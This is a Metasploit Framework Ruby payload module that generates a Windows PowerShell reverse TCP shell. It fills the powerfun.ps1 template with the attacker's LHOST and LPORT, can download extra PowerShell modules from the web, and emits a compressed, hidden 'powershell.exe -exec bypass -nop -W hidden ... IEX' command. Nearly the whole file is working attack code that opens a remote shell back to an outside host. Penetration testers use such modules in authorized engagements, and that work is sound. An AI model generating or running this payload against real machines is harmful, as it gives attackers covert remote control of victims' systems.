##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/base/sessions/powershell'

module Metasploit3

  CachedSize = 1342

  include Msf::Payload::Single
  include Rex::Powershell::Command

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP',
      'Description'   => 'Interacts with a powershell session on an established socket connection',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'windows',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::PowerShell,
      'RequiredCmd'   => 'generic',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
      register_options(
      [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
      ], self.class)
  end

  def generate
    lport = datastore['LPORT']
    lhost = datastore['LHOST']

    template_path = ::File.join( Msf::Config.data_directory, 'exploits', 'powershell','powerfun.ps1')
    script_in = ""
    ::File.open(template_path, "rb") do |fd|
      script_in << fd.read(fd.stat.size)
    end

    script_in << "\npowerfun -Command reverse"

    mods = ''

    if datastore['LOAD_MODULES']
      mods_array = datastore['LOAD_MODULES'].to_s.split(',')
      mods_array.collect(&:strip)
      vprint_status("Loading #{mods_array.count} modules into the interactive PowerShell session")
      mods_array.each {|m| vprint_good " #{m}"}
      mods = "\"#{mods_array.join("\",\n\"")}\""
      script_in << " -Download true\n"
    end

    script_in.gsub!('MODULES_REPLACE', mods)
    script_in.gsub!('LPORT_REPLACE', lport.to_s)
    script_in.gsub!('LHOST_REPLACE', lhost.to_s)

    script = Rex::Powershell::Command.compress_script(script_in)
    "powershell.exe -exec bypass -nop -W hidden -noninteractive IEX $(#{script})"
  end

end
